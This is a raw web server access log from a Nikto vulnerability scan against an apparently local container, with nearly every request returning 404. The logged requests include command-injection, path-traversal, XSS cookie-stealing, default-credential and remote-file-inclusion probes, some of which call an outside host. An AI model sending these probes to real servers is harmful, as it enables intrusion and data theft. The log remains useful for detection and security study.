172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /LiveHelp/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001123)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /logicworks.ini HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001124)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /login.jsp HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001125)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /logins.html HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001126)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /logs/str_err.log HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001127)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /mall_log_files/order.log HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001128)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /mambo/administrator/phpinfo.php HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001129)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /megabook/files/20/setup.db HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001130)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?name=Members_List&sql_debug=1 HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001132)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /myinvoicer/config.inc HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001133)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /officescan/hotdownload/ofscan.ini HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001134)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /order/order_log_v12.dat HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001135)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /order/order_log.dat HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001136)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /orders/order_log_v12.dat HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001137)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Orders/order_log_v12.dat HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001138)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /orders/order_log.dat HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001139)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Orders/order_log.dat HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001140)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /PDG_Cart/shopper.conf HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001141)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phorum/admin/stats.php HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001142)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /php-coolfile/action.php?action=edit&file=config.php HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001143)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/phpinfo.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001144)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpinfo.php HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001145)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpinfo.php3 HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001146)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /pmlite.php HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001147)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /session/admnlogin HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001148)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /settings/site.ini HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001149)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /SiteScope/htdocs/SiteScope.html HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001150)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /soapdocs/ReleaseNotes.html HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001151)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ssdefs/siteseed.dtd HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001152)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /servlet/allaire.jrun.ssi.SSIFilter HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001153)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /pp.php?action=login HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001154)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /isapi/count.pl? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001155)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /krysalis/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001156)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /logjam/showhits.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001157)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /manual.php HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001158)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /mods/apage/apage.cgi?f=file.htm.|id| HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001159)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001160)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /nuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001161)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /perl/-e%20%22system('cat%20/etc/passwd');\\%22 HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001162)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpnuke/html/.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001163)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpnuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001164)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Program%20Files/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001165)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /smssend.php HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001166)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /pls/simpledad/admin_/dadentries.htm HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001167)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "POST /Mem/dynaform/Login.htm?WINDWEB_URL=%2FMem%2Fdynaform%2FLogin.htm&ListIndexUser=0&sWebParam1=admin000 HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001168)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ncl_items.html HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001169)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ncl_items.shtml?SUBJECT=1 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001170)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /photo/manage.cgi HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001171)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /photodata/manage.cgi HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001172)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /pub/english.cgi?op=rmail HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001174)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /pvote/ch_info.php?newpass=password&confirm=password%20 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001175)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /scripts/wsisa.dll/WService=anything?WSMadmin HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001176)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /SetSecurity.shm HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001177)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /submit?setoption=q&option=allowed_ips&value=255.255.255.255 HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001178)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /thebox/admin.php?act=write&username=admin&password=admin&aduser=admin&adpass=admin HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001179)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /servlet/admin?category=server&method=listAll&Authorization=Digest+username%3D%22admin%22%2C+response%3D%22ae9f86d6beaa3f9ecb9a5b7e072a4138%22%2C+nonce%3D%222b089ba7985a883ab2eddcd3539a6c94%22%2C+realm%3D%22adminRealm%22%2C+uri%3D%22%2Fservlet%2Fadmin%22& HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001180)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /shopadmin.asp HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001181)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modsecurity.php?inc_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001182)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB2/includes/db.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001183)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /<script>alert('Vulnerable')</script> HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001184)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_bin/shtml.exe/junk_nonexistant.exe HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001185)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_txt/_vti_cnf/ HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001186)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_txt/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001187)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_pvt/deptodoc.btr HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001188)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_pvt/doctodep.btr HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001189)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_pvt/services.org HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001190)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "POST /_vti_bin/shtml.dll/_vti_rpc?method=server+version%3a4%2e0%2e2%2e2611 HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001191)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "POST /_vti_bin/shtml.exe/_vti_rpc?method=server+version%3a4%2e0%2e2%2e2611 HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001192)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "POST /_vti_bin/_vti_aut/author.dll?method=list+documents%3a3%2e0%2e2%2e1706&service%5fname=&listHiddenDocs=true&listExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=true&listIncludeParent=true&listDerivedT=false&listBorders=fals HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001193)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "POST /_vti_bin/_vti_aut/author.exe?method=list+documents%3a3%2e0%2e2%2e1706&service%5fname=&listHiddenDocs=true&listExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=true&listIncludeParent=true&listDerivedT=false&listBorders=fals HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001194)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_bin/_vti_aut/dvwssr.dll HTTP/1.1" 404 483 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001195)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_bin/_vti_aut/fp30reg.dll?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001196)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001197)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_pvt/access.cnf HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001198)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_pvt/botinfs.cnf HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001199)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_pvt/bots.cnf HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001200)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_pvt/service.cnf HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001201)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_pvt/services.cnf HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001202)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_pvt/svacl.cnf HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001203)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_pvt/writeto.cnf HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001204)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_pvt/linkinfo.cnf HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001205)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001206)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /isx.html HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001207)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /// HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001208)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /mailman/admin/ml-name?\\\"><script>alert('Vulnerable')</script>; HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001210)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /mailman/listinfo HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001212)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /doc/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001213)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /doc HTTP/1.1" 404 494 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001214)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /webalizer/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001215)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /web/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001216)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /usage/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001217)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /sitemap.xml HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001218)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /photo_album/apa_phpinclude.inc.php?apa_module_basedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001220)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cgis/wwwboard/wwwboard.cgi HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001221)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cgis/wwwboard/wwwboard.pl HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001222)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /affich.php?image=<script>alert(document.cookie)</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001223)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /diapo.php?rep=<script>alert(document.cookie)</script> HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001224)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?rep=<script>alert(document.cookie)</script> HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001225)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin/contextAdmin/contextAdmin.html HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001226)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /fcgi-bin/echo?foo=<script>alert('Vulnerable')</script> HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001227)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /fcgi-bin/echo2?foo=<script>alert('Vulnerable')</script> HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001228)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /fcgi-bin/echo.exe?foo=<script>alert('Vulnerable')</script> HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001229)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /fcgi-bin/echo2.exe?foo=<script>alert('Vulnerable')</script> HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001230)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /blahb.ida HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001231)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /blahb.idq HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001232)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /\\\"><img%20src=\\\"javascript:alert(document.domain)\\\"> HTTP/1.1" 404 565 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001236)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Survey/Survey.Htm HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001237)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /WEBAGENT/CQMGSERV/CF-SINFO.TPF HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001238)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /apps/web/index.fcgi?servers=&section=<script>alert(document.cookie)</script> HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001241)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /dba4.nsf HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001242)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /BACLIENT HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001243)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postinfo.html HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001244)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /na_admin/ataglance.html HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001245)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /scripts/samples/search/qfullhit.htw HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001246)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /scripts/samples/search/qsumrhit.htw HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001247)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /LjACA.htw HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001248)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /file/../../../../../../../../etc/ HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001252)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/16/exec/-///pwd HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001253)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/16/exec/-///show/configuration HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001254)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/16 HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001255)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/16/exec/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001256)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/16/exec//show/access-lists HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001257)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/16/level/16/exec//show/configuration HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001258)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/16/level/16/exec//show/interfaces HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001259)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/16/level/16/exec//show/interfaces/status HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001260)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/16/level/16/exec//show/version HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001261)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/16/level/16/exec//show/running-config/interface/FastEthernet HTTP/1.1" 404 557 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001262)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/16/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001263)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/17/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001264)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/18/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001265)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/19/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001266)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/20/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001267)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/21/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001268)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/22/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001269)"
